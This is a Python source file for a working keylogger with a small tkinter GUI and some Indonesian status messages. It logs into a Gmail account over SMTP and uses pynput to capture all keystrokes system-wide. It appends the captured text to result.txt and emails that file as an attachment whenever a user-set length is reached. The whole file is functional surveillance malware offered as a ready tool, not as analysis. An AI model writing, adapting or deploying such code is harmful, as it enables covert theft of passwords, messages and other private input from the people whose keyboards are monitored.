import tkinter as tk
from tkinter import ttk
from tkinter import *
import time, smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener


class Application(tk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.pack()
        self.master.geometry("250x150")
        self.master.title("Key Logger Gui")
        self.create_widgets()
        self.full_log = ""
        self.word = ""

    def limit_settings(self):
        # Limit
        self.label_limit = ttk.Label(self)
        self.label_limit.configure(text="Limit Value: ")
        self.label_limit.pack()

        # Entry Limit
        self.input_limit = tk.IntVar()
        self.entry_limit = ttk.Entry(self)
        self.entry_limit.configure(textvariable=self.input_limit)
        self.entry_limit.pack()

        # Button Start
        self.button_start = ttk.Button(self)
        self.button_start.configure(text="Start Program")
        self.button_start.configure(command=self.start_log)
        self.button_start.pack()

    # Create Widgets function
    def create_widgets(self):
        # Email
        self.label_email = ttk.Label(self)
        self.label_email.configure(text="Email: ")
        self.label_email.pack()

        # Entry Email
        self.input_email = tk.StringVar()
        self.entry_email = ttk.Entry(self)
        self.entry_email.configure(textvariable=self.input_email)
        self.entry_email.pack()

        # Password
        self.label_password = ttk.Label(self)
        self.label_password.configure(text="Password: ")
        self.label_password.pack()

        # Entry Password
        self.input_password = tk.StringVar()
        self.entry_password = ttk.Entry(self, show="*")
        self.entry_password.configure(textvariable=self.input_password)
        self.entry_password.pack()

        # Button Login
        self.button_login = ttk.Button(self)
        self.button_login.configure(text="Login")
        self.button_login.configure(command=self.login)
        self.button_login.pack()

        # status
        self.label_status = ttk.Label(self)
        self.label_status.configure(text="Status : Idle")
        self.label_status.pack()

    # Event Callback Function

    def login(self):
        try:
            email = self.entry_email.get()
            password = self.entry_password.get()
            server = smtplib.SMTP_SSL(host="smtp.gmail.com", port=465)
            server.login(email, password)
            self.label_status.configure(text="Status : Login Sukses!")
            self.label_email.pack_forget()
            self.label_password.pack_forget()
            self.entry_email.pack_forget()
            self.entry_password.pack_forget()
            self.button_login.pack_forget()
            self.limit_settings()
        except:
            print("Error Tak Terduga!,Pastikan Email Password Sudah Benar!")
            self.label_status.configure(text="Status : Unknown Error!")

    def start_log(self):
        print("Program Started!")
        self.button_start.configure(text="Program Started")
        self.label_status.configure(text="Status : Configuration Successfully Reset!")
        l = Listener(on_press=self.log)
        l.start()

    def log(self, keys):
        global full_log
        global word
        global email
        global entry_limit

        if keys == Key.space or keys == Key.enter:
            self.word += " "
            self.full_log += self.word
            self.word = " "
            if len(self.full_log) >= int(self.entry_limit.get()):
                self.send_log()
                self.full_log = " "
        elif (
            keys == Key.shift_l
            or keys == Key.shift_r
            or keys == Key.ctrl_l
            or keys == Key.ctrl_r
            or keys == Key.tab
        ):
            return

        elif keys == Key.backspace:
            self.word = self.word[:-1]

        else:
            char = f"{keys}"
            char = char[1:-1]
            self.word += char

        if keys == Key.esc:
            return False

    def send_log(self):
        with open("result.txt", "a+") as r:
            r.write(self.full_log + "\n")
            r.close()
            # write in text

        msg = MIMEMultipart()
        body = "Logger : " + "\n"
        msg.attach(MIMEText(body, "plain"))
        filename = "Logger Result.txt"
        attachment = open("result.txt", "rb")
        p = MIMEBase("application", "octet-stream")
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
        msg.attach(p)
        text = msg.as_string()
        # Send Email
        email = self.entry_email.get()
        password = self.entry_password.get()
        server = smtplib.SMTP_SSL(host="smtp.gmail.com", port=465)
        server.login(email, password)
        server.sendmail(email, email, text)


def main():
    root = tk.Tk()
    app = Application(master=root)  # Inherit class inheritance!
    app.mainloop()


if __name__ == "__main__":
    main()
